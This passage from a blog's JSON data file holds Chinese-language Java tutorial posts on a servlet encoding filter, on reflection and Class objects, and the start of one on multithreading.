class=\"name\">filter-class</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">filter</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">filter-mapping</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filter-name</span>&gt;</span>CharacterEncodingFilter<span class=\"tag\">&lt;/<span class=\"name\">filter-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--过滤所有请求--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/*<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.blue.filter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CharactorEncodingFilter</span> <span class=\"keyword\">implements</span> <span class=\"title\">Filter</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">(FilterConfig filterConfig)</span> <span class=\"keyword\">throws</span> ServletException </span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"comment\">//filterChain:链的意思,一边出一边进,这样就可以使用多个过滤器串联起来</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">doFilter</span><span class=\"params\">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class=\"keyword\">throws</span> IOException, ServletException </span>&#123;</span><br><span class=\"line\">        servletRequest.setCharacterEncoding(<span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">        servletResponse.setCharacterEncoding(<span class=\"string\">&quot;utf-8&quot;</span>);</span><br><span class=\"line\">        servletResponse.setContentType(<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class=\"line\">        filterChain.doFilter(servletRequest, servletResponse);<span class=\"comment\">//让请求继续走,不写程序就会在这里停止</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">destroy</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"java反射","date":"2022-01-11T05:02:55.000Z","_content":"\n先认识一下动态和静态语言<!--more-->\n\n#### 动态语言\n\n是一类在运行时可以改变其结构的语言:例如新的函数,对象,甚至代码可以被引进,已有的函数可以被删除或是其他结构上的变化,通俗点说就是在运行时代码可以 根据某些条件改变自身结构\n\n主要动态语言:c#,javaScript,PHP,Python等\n\n#### 静态语言\n\n与动态语言相对应的,运行时结构不可改变的语言就是静态语言,不如java,c,c++\n\njava不是动态语言,但是java可以称之为\"准动态语言\",即java有一定的动态性,我们可以<label style=\"background:yellow\">利用反射机制获得类似动态语言的特性</label>,java的动态性让编程的时候更加灵活\n\n## java反射\n\n**通俗讲就是可以通过对象找到它的类**\n\nreflection是java被视为动态语言的关键,反射机制允许程序在执行期间借助于Reflection API取得任何类的内部信息,并能直接操作任意对象的内部属性及方法\n\n`Class c=Class.forName(\"java.lang.String\")`\n\n加载完类之后,在堆内存的方法区中就产生了一个Class类型的对象(一个类只有一个Class对象),这个对象就<label style=\"background:yellow\">包含了完整的类的结构信息</label>,我们可以通过这个对象看到类的结构,这个对象就像一面镜子,透过这个镜子看到类的结构,所以,它被形象的称之为反射\n\n正常方式:    `引入需要的\"包类\"名称`--->`通过new实例化`--->`取得实例化对象`\n\n反射方式:    `实例化对象`----->`getClass()方法`----->`得到完整的\"包类\"名称`\n\n#### 反射相关的主要API\n\n- java.lang.Class  代表一个类\n\n- java.lang.reflect.Method  代表类的方法\n\n- java.lang.reflect.Field  代表类的成员变量\n\n- java.lang.reflect.Constructor  代表类的构造器\n\n- ...............\n\n#### Class类\n\n对于每个类而言,JRE都为其保留了一个不变的Class类型的对象,一个Class对象包含了特定某个结构的所有信息\n\n- Class本身也是一个类\n- Class对象只能由系统建立对象\n- 一个加载的类在JVM中只会有一个Class实例\n- 一个Class对象对应的是一个加载到JVM中的一个class文件\n- 每个类的实例都会记得自己是由哪个Class实例所生成\n- 通过Class可以完整地得到一个类中的所有被夹在的结构\n- Class类是Reflection的根源,针对任何你想动态加载,运行的类,唯有先获得相应的Class对象\n\n#### 获取Class类的方法\n\n![image-20220111164508670](https://gitee.com/blue_satchel/images/raw/master/image-20220111164508670.png)\n\n此时hashCode相等,说明三种方法获得的都是同一个class\n\n还有一个方式四,但是只能获得基本内置类型\n\n```java\nClass c4 = Integer.TYPE;\n```\n\n还可以通过getSuperclass()获得父类的Class对象\n\n```java\nClass c5 = c1.getSuperclass;\n```\n\n方法还有..........\n\n##### 所有类型的Class对象\n\n```java\npackage com;\n\nimport java.lang.annotation.ElementType;\n\npublic class test2 {\n    public static void main(String[] args) {\n        Class c1=Object.class;//类\n        Class c2=Comparable.class;//接口\n        Class c3=String[].class;//一维数组\n        Class c4=int[][].class;//二维数组\n        Class c5=Override.class;//注解\n        Class c6= ElementType.class;//枚举\n        Class c7=Integer.class;//基本数据类型\n        Class c8=void.class;//void\n        Class c9=Class.class;//class\n        System.out.println(c1);\n        System.out.println(c2);\n        System.out.println(c3);\n        System.out.println(c4);\n        System.out.println(c5);\n        System.out.println(c6);\n        System.out.println(c7);\n        System.out.println(c8);\n        System.out.println(c9);\n        int[] a=new int[10];\n        int[] b=new int[100];\n        int[][] c=new int [10][10];\n        System.out.println(a.getClass().hashCode());\n        System.out.println(b.getClass().hashCode());\n        System.out.println(c.getClass().hashCode());\n\n    }\n}\n\n```\n\n<label style=\"background:yellow\">只要元素类型与维度一样,就是同一个Class</label>\n\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220111170812325.png\" alt=\"image-20220111170812325\" style=\"zoom:80%;\" />\n\n#### 类加载内存分析\n\n##### java内存\n\n1. 堆\n\n- 存放new的对象和数组\n\n- 可以被所有线程共享,不会存放别的对象引用\n\n2. 栈\n\n- 存放基本变量类型(会包含这个基本类型的具体数值)\n\n- 引用对象的变量(会存放这个引用在堆里面的具体地址)\n\n3. 方法区\n\n- 可以被所有的线程共享\n\n- 包含了所有的class和static变量\n","source":"_posts/java反射.md","raw":"---\ntitle: java反射\ndate: 2022-01-11 13:02:55\ntags:\n      - java\n      - reflection\ncategories: java\n---\n\n先认识一下动态和静态语言<!--more-->\n\n#### 动态语言\n\n是一类在运行时可以改变其结构的语言:例如新的函数,对象,甚至代码可以被引进,已有的函数可以被删除或是其他结构上的变化,通俗点说就是在运行时代码可以 根据某些条件改变自身结构\n\n主要动态语言:c#,javaScript,PHP,Python等\n\n#### 静态语言\n\n与动态语言相对应的,运行时结构不可改变的语言就是静态语言,不如java,c,c++\n\njava不是动态语言,但是java可以称之为\"准动态语言\",即java有一定的动态性,我们可以<label style=\"background:yellow\">利用反射机制获得类似动态语言的特性</label>,java的动态性让编程的时候更加灵活\n\n## java反射\n\n**通俗讲就是可以通过对象找到它的类**\n\nreflection是java被视为动态语言的关键,反射机制允许程序在执行期间借助于Reflection API取得任何类的内部信息,并能直接操作任意对象的内部属性及方法\n\n`Class c=Class.forName(\"java.lang.String\")`\n\n加载完类之后,在堆内存的方法区中就产生了一个Class类型的对象(一个类只有一个Class对象),这个对象就<label style=\"background:yellow\">包含了完整的类的结构信息</label>,我们可以通过这个对象看到类的结构,这个对象就像一面镜子,透过这个镜子看到类的结构,所以,它被形象的称之为反射\n\n正常方式:    `引入需要的\"包类\"名称`--->`通过new实例化`--->`取得实例化对象`\n\n反射方式:    `实例化对象`----->`getClass()方法`----->`得到完整的\"包类\"名称`\n\n#### 反射相关的主要API\n\n- java.lang.Class  代表一个类\n\n- java.lang.reflect.Method  代表类的方法\n\n- java.lang.reflect.Field  代表类的成员变量\n\n- java.lang.reflect.Constructor  代表类的构造器\n\n- ...............\n\n#### Class类\n\n对于每个类而言,JRE都为其保留了一个不变的Class类型的对象,一个Class对象包含了特定某个结构的所有信息\n\n- Class本身也是一个类\n- Class对象只能由系统建立对象\n- 一个加载的类在JVM中只会有一个Class实例\n- 一个Class对象对应的是一个加载到JVM中的一个class文件\n- 每个类的实例都会记得自己是由哪个Class实例所生成\n- 通过Class可以完整地得到一个类中的所有被夹在的结构\n- Class类是Reflection的根源,针对任何你想动态加载,运行的类,唯有先获得相应的Class对象\n\n#### 获取Class类的方法\n\n![image-20220111164508670](https://gitee.com/blue_satchel/images/raw/master/image-20220111164508670.png)\n\n此时hashCode相等,说明三种方法获得的都是同一个class\n\n还有一个方式四,但是只能获得基本内置类型\n\n```java\nClass c4 = Integer.TYPE;\n```\n\n还可以通过getSuperclass()获得父类的Class对象\n\n```java\nClass c5 = c1.getSuperclass;\n```\n\n方法还有..........\n\n##### 所有类型的Class对象\n\n```java\npackage com;\n\nimport java.lang.annotation.ElementType;\n\npublic class test2 {\n    public static void main(String[] args) {\n        Class c1=Object.class;//类\n        Class c2=Comparable.class;//接口\n        Class c3=String[].class;//一维数组\n        Class c4=int[][].class;//二维数组\n        Class c5=Override.class;//注解\n        Class c6= ElementType.class;//枚举\n        Class c7=Integer.class;//基本数据类型\n        Class c8=void.class;//void\n        Class c9=Class.class;//class\n        System.out.println(c1);\n        System.out.println(c2);\n        System.out.println(c3);\n        System.out.println(c4);\n        System.out.println(c5);\n        System.out.println(c6);\n        System.out.println(c7);\n        System.out.println(c8);\n        System.out.println(c9);\n        int[] a=new int[10];\n        int[] b=new int[100];\n        int[][] c=new int [10][10];\n        System.out.println(a.getClass().hashCode());\n        System.out.println(b.getClass().hashCode());\n        System.out.println(c.getClass().hashCode());\n\n    }\n}\n\n```\n\n<label style=\"background:yellow\">只要元素类型与维度一样,就是同一个Class</label>\n\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220111170812325.png\" alt=\"image-20220111170812325\" style=\"zoom:80%;\" />\n\n#### 类加载内存分析\n\n##### java内存\n\n1. 堆\n\n- 存放new的对象和数组\n\n- 可以被所有线程共享,不会存放别的对象引用\n\n2. 栈\n\n- 存放基本变量类型(会包含这个基本类型的具体数值)\n\n- 引用对象的变量(会存放这个引用在堆里面的具体地址)\n\n3. 方法区\n\n- 可以被所有的线程共享\n\n- 包含了所有的class和static变量\n","slug":"java反射","published":1,"updated":"2022-01-15T15:29:39.560Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9mj0014gsw9dng6cko3","content":"<p>先认识一下动态和静态语言<span id=\"more\"></span></p>\n<h4 id=\"动态语言\"><a href=\"#动态语言\" class=\"headerlink\" title=\"动态语言\"></a>动态语言</h4><p>是一类在运行时可以改变其结构的语言:例如新的函数,对象,甚至代码可以被引进,已有的函数可以被删除或是其他结构上的变化,通俗点说就是在运行时代码可以 根据某些条件改变自身结构</p>\n<p>主要动态语言:c#,javaScript,PHP,Python等</p>\n<h4 id=\"静态语言\"><a href=\"#静态语言\" class=\"headerlink\" title=\"静态语言\"></a>静态语言</h4><p>与动态语言相对应的,运行时结构不可改变的语言就是静态语言,不如java,c,c++</p>\n<p>java不是动态语言,但是java可以称之为”准动态语言”,即java有一定的动态性,我们可以<label style=\"background:yellow\">利用反射机制获得类似动态语言的特性</label>,java的动态性让编程的时候更加灵活</p>\n<h2 id=\"java反射\"><a href=\"#java反射\" class=\"headerlink\" title=\"java反射\"></a>java反射</h2><p><strong>通俗讲就是可以通过对象找到它的类</strong></p>\n<p>reflection是java被视为动态语言的关键,反射机制允许程序在执行期间借助于Reflection API取得任何类的内部信息,并能直接操作任意对象的内部属性及方法</p>\n<p><code>Class c=Class.forName(&quot;java.lang.String&quot;)</code></p>\n<p>加载完类之后,在堆内存的方法区中就产生了一个Class类型的对象(一个类只有一个Class对象),这个对象就<label style=\"background:yellow\">包含了完整的类的结构信息</label>,我们可以通过这个对象看到类的结构,这个对象就像一面镜子,透过这个镜子看到类的结构,所以,它被形象的称之为反射</p>\n<p>正常方式:    <code>引入需要的&quot;包类&quot;名称</code>—&gt;<code>通过new实例化</code>—&gt;<code>取得实例化对象</code></p>\n<p>反射方式:    <code>实例化对象</code>—–&gt;<code>getClass()方法</code>—–&gt;<code>得到完整的&quot;包类&quot;名称</code></p>\n<h4 id=\"反射相关的主要API\"><a href=\"#反射相关的主要API\" class=\"headerlink\" title=\"反射相关的主要API\"></a>反射相关的主要API</h4><ul>\n<li><p>java.lang.Class  代表一个类</p>\n</li>\n<li><p>java.lang.reflect.Method  代表类的方法</p>\n</li>\n<li><p>java.lang.reflect.Field  代表类的成员变量</p>\n</li>\n<li><p>java.lang.reflect.Constructor  代表类的构造器</p>\n</li>\n<li><p>……………</p>\n</li>\n</ul>\n<h4 id=\"Class类\"><a href=\"#Class类\" class=\"headerlink\" title=\"Class类\"></a>Class类</h4><p>对于每个类而言,JRE都为其保留了一个不变的Class类型的对象,一个Class对象包含了特定某个结构的所有信息</p>\n<ul>\n<li>Class本身也是一个类</li>\n<li>Class对象只能由系统建立对象</li>\n<li>一个加载的类在JVM中只会有一个Class实例</li>\n<li>一个Class对象对应的是一个加载到JVM中的一个class文件</li>\n<li>每个类的实例都会记得自己是由哪个Class实例所生成</li>\n<li>通过Class可以完整地得到一个类中的所有被夹在的结构</li>\n<li>Class类是Reflection的根源,针对任何你想动态加载,运行的类,唯有先获得相应的Class对象</li>\n</ul>\n<h4 id=\"获取Class类的方法\"><a href=\"#获取Class类的方法\" class=\"headerlink\" title=\"获取Class类的方法\"></a>获取Class类的方法</h4><p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220111164508670.png\" alt=\"image-20220111164508670\"></p>\n<p>此时hashCode相等,说明三种方法获得的都是同一个class</p>\n<p>还有一个方式四,但是只能获得基本内置类型</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class c4 = Integer.TYPE;</span><br></pre></td></tr></table></figure>\n\n<p>还可以通过getSuperclass()获得父类的Class对象</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class c5 = c1.getSuperclass;</span><br></pre></td></tr></table></figure>\n\n<p>方法还有……….</p>\n<h5 id=\"所有类型的Class对象\"><a href=\"#所有类型的Class对象\" class=\"headerlink\" title=\"所有类型的Class对象\"></a>所有类型的Class对象</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.ElementType;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test2</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Class c1=Object.class;<span class=\"comment\">//类</span></span><br><span class=\"line\">        Class c2=Comparable.class;<span class=\"comment\">//接口</span></span><br><span class=\"line\">        Class c3=String[].class;<span class=\"comment\">//一维数组</span></span><br><span class=\"line\">        Class c4=<span class=\"keyword\">int</span>[][].class;<span class=\"comment\">//二维数组</span></span><br><span class=\"line\">        Class c5=Override.class;<span class=\"comment\">//注解</span></span><br><span class=\"line\">        Class c6= ElementType.class;<span class=\"comment\">//枚举</span></span><br><span class=\"line\">        Class c7=Integer.class;<span class=\"comment\">//基本数据类型</span></span><br><span class=\"line\">        Class c8=<span class=\"keyword\">void</span>.class;<span class=\"comment\">//void</span></span><br><span class=\"line\">        Class c9=Class.class;<span class=\"comment\">//class</span></span><br><span class=\"line\">        System.out.println(c1);</span><br><span class=\"line\">        System.out.println(c2);</span><br><span class=\"line\">        System.out.println(c3);</span><br><span class=\"line\">        System.out.println(c4);</span><br><span class=\"line\">        System.out.println(c5);</span><br><span class=\"line\">        System.out.println(c6);</span><br><span class=\"line\">        System.out.println(c7);</span><br><span class=\"line\">        System.out.println(c8);</span><br><span class=\"line\">        System.out.println(c9);</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] a=<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[<span class=\"number\">10</span>];</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] b=<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[<span class=\"number\">100</span>];</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[][] c=<span class=\"keyword\">new</span> <span class=\"keyword\">int</span> [<span class=\"number\">10</span>][<span class=\"number\">10</span>];</span><br><span class=\"line\">        System.out.println(a.getClass().hashCode());</span><br><span class=\"line\">        System.out.println(b.getClass().hashCode());</span><br><span class=\"line\">        System.out.println(c.getClass().hashCode());</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><label style=\"background:yellow\">只要元素类型与维度一样,就是同一个Class</label></p>\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220111170812325.png\" alt=\"image-20220111170812325\" style=\"zoom:80%;\" />\n\n<h4 id=\"类加载内存分析\"><a href=\"#类加载内存分析\" class=\"headerlink\" title=\"类加载内存分析\"></a>类加载内存分析</h4><h5 id=\"java内存\"><a href=\"#java内存\" class=\"headerlink\" title=\"java内存\"></a>java内存</h5><ol>\n<li>堆</li>\n</ol>\n<ul>\n<li><p>存放new的对象和数组</p>\n</li>\n<li><p>可以被所有线程共享,不会存放别的对象引用</p>\n</li>\n</ul>\n<ol start=\"2\">\n<li>栈</li>\n</ol>\n<ul>\n<li><p>存放基本变量类型(会包含这个基本类型的具体数值)</p>\n</li>\n<li><p>引用对象的变量(会存放这个引用在堆里面的具体地址)</p>\n</li>\n</ul>\n<ol start=\"3\">\n<li>方法区</li>\n</ol>\n<ul>\n<li><p>可以被所有的线程共享</p>\n</li>\n<li><p>包含了所有的class和static变量</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>先认识一下动态和静态语言","more":"</p>\n<h4 id=\"动态语言\"><a href=\"#动态语言\" class=\"headerlink\" title=\"动态语言\"></a>动态语言</h4><p>是一类在运行时可以改变其结构的语言:例如新的函数,对象,甚至代码可以被引进,已有的函数可以被删除或是其他结构上的变化,通俗点说就是在运行时代码可以 根据某些条件改变自身结构</p>\n<p>主要动态语言:c#,javaScript,PHP,Python等</p>\n<h4 id=\"静态语言\"><a href=\"#静态语言\" class=\"headerlink\" title=\"静态语言\"></a>静态语言</h4><p>与动态语言相对应的,运行时结构不可改变的语言就是静态语言,不如java,c,c++</p>\n<p>java不是动态语言,但是java可以称之为”准动态语言”,即java有一定的动态性,我们可以<label style=\"background:yellow\">利用反射机制获得类似动态语言的特性</label>,java的动态性让编程的时候更加灵活</p>\n<h2 id=\"java反射\"><a href=\"#java反射\" class=\"headerlink\" title=\"java反射\"></a>java反射</h2><p><strong>通俗讲就是可以通过对象找到它的类</strong></p>\n<p>reflection是java被视为动态语言的关键,反射机制允许程序在执行期间借助于Reflection API取得任何类的内部信息,并能直接操作任意对象的内部属性及方法</p>\n<p><code>Class c=Class.forName(&quot;java.lang.String&quot;)</code></p>\n<p>加载完类之后,在堆内存的方法区中就产生了一个Class类型的对象(一个类只有一个Class对象),这个对象就<label style=\"background:yellow\">包含了完整的类的结构信息</label>,我们可以通过这个对象看到类的结构,这个对象就像一面镜子,透过这个镜子看到类的结构,所以,它被形象的称之为反射</p>\n<p>正常方式:    <code>引入需要的&quot;包类&quot;名称</code>—&gt;<code>通过new实例化</code>—&gt;<code>取得实例化对象</code></p>\n<p>反射方式:    <code>实例化对象</code>—–&gt;<code>getClass()方法</code>—–&gt;<code>得到完整的&quot;包类&quot;名称</code></p>\n<h4 id=\"反射相关的主要API\"><a href=\"#反射相关的主要API\" class=\"headerlink\" title=\"反射相关的主要API\"></a>反射相关的主要API</h4><ul>\n<li><p>java.lang.Class  代表一个类</p>\n</li>\n<li><p>java.lang.reflect.Method  代表类的方法</p>\n</li>\n<li><p>java.lang.reflect.Field  代表类的成员变量</p>\n</li>\n<li><p>java.lang.reflect.Constructor  代表类的构造器</p>\n</li>\n<li><p>……………</p>\n</li>\n</ul>\n<h4 id=\"Class类\"><a href=\"#Class类\" class=\"headerlink\" title=\"Class类\"></a>Class类</h4><p>对于每个类而言,JRE都为其保留了一个不变的Class类型的对象,一个Class对象包含了特定某个结构的所有信息</p>\n<ul>\n<li>Class本身也是一个类</li>\n<li>Class对象只能由系统建立对象</li>\n<li>一个加载的类在JVM中只会有一个Class实例</li>\n<li>一个Class对象对应的是一个加载到JVM中的一个class文件</li>\n<li>每个类的实例都会记得自己是由哪个Class实例所生成</li>\n<li>通过Class可以完整地得到一个类中的所有被夹在的结构</li>\n<li>Class类是Reflection的根源,针对任何你想动态加载,运行的类,唯有先获得相应的Class对象</li>\n</ul>\n<h4 id=\"获取Class类的方法\"><a href=\"#获取Class类的方法\" class=\"headerlink\" title=\"获取Class类的方法\"></a>获取Class类的方法</h4><p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220111164508670.png\" alt=\"image-20220111164508670\"></p>\n<p>此时hashCode相等,说明三种方法获得的都是同一个class</p>\n<p>还有一个方式四,但是只能获得基本内置类型</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class c4 = Integer.TYPE;</span><br></pre></td></tr></table></figure>\n\n<p>还可以通过getSuperclass()获得父类的Class对象</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class c5 = c1.getSuperclass;</span><br></pre></td></tr></table></figure>\n\n<p>方法还有……….</p>\n<h5 id=\"所有类型的Class对象\"><a href=\"#所有类型的Class对象\" class=\"headerlink\" title=\"所有类型的Class对象\"></a>所有类型的Class对象</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.ElementType;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test2</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Class c1=Object.class;<span class=\"comment\">//类</span></span><br><span class=\"line\">        Class c2=Comparable.class;<span class=\"comment\">//接口</span></span><br><span class=\"line\">        Class c3=String[].class;<span class=\"comment\">//一维数组</span></span><br><span class=\"line\">        Class c4=<span class=\"keyword\">int</span>[][].class;<span class=\"comment\">//二维数组</span></span><br><span class=\"line\">        Class c5=Override.class;<span class=\"comment\">//注解</span></span><br><span class=\"line\">        Class c6= ElementType.class;<span class=\"comment\">//枚举</span></span><br><span class=\"line\">        Class c7=Integer.class;<span class=\"comment\">//基本数据类型</span></span><br><span class=\"line\">        Class c8=<span class=\"keyword\">void</span>.class;<span class=\"comment\">//void</span></span><br><span class=\"line\">        Class c9=Class.class;<span class=\"comment\">//class</span></span><br><span class=\"line\">        System.out.println(c1);</span><br><span class=\"line\">        System.out.println(c2);</span><br><span class=\"line\">        System.out.println(c3);</span><br><span class=\"line\">        System.out.println(c4);</span><br><span class=\"line\">        System.out.println(c5);</span><br><span class=\"line\">        System.out.println(c6);</span><br><span class=\"line\">        System.out.println(c7);</span><br><span class=\"line\">        System.out.println(c8);</span><br><span class=\"line\">        System.out.println(c9);</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] a=<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[<span class=\"number\">10</span>];</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] b=<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[<span class=\"number\">100</span>];</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[][] c=<span class=\"keyword\">new</span> <span class=\"keyword\">int</span> [<span class=\"number\">10</span>][<span class=\"number\">10</span>];</span><br><span class=\"line\">        System.out.println(a.getClass().hashCode());</span><br><span class=\"line\">        System.out.println(b.getClass().hashCode());</span><br><span class=\"line\">        System.out.println(c.getClass().hashCode());</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><label style=\"background:yellow\">只要元素类型与维度一样,就是同一个Class</label></p>\n<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220111170812325.png\" alt=\"image-20220111170812325\" style=\"zoom:80%;\" />\n\n<h4 id=\"类加载内存分析\"><a href=\"#类加载内存分析\" class=\"headerlink\" title=\"类加载内存分析\"></a>类加载内存分析</h4><h5 id=\"java内存\"><a href=\"#java内存\" class=\"headerlink\" title=\"java内存\"></a>java内存</h5><ol>\n<li>堆</li>\n</ol>\n<ul>\n<li><p>存放new的对象和数组</p>\n</li>\n<li><p>可以被所有线程共享,不会存放别的对象引用</p>\n</li>\n</ul>\n<ol start=\"2\">\n<li>栈</li>\n</ol>\n<ul>\n<li><p>存放基本变量类型(会包含这个基本类型的具体数值)</p>\n</li>\n<li><p>引用对象的变量(会存放这个引用在堆里面的具体地址)</p>\n</li>\n</ul>\n<ol start=\"3\">\n<li>方法区</li>\n</ol>\n<ul>\n<li><p>可以被所有的线程共享</p>\n</li>\n<li><p>包含了所有的class和static变量</p>\n</li>\n</ul>"},{"title":"java多线程","date":"2021-12-23T15:24:47.000Z","description":"java多线程","typora-root-url":"..","_content":"\n#### 多线程相关概念\n\n并发:同一个时刻,多个任务交替执行,造成一种貌似同时的错觉,简单的说,单核CPU实现的多任务就是并发\n\n并行:同一个时刻,多个任务同时执行,多核CPU可以实现并行\n\n#### 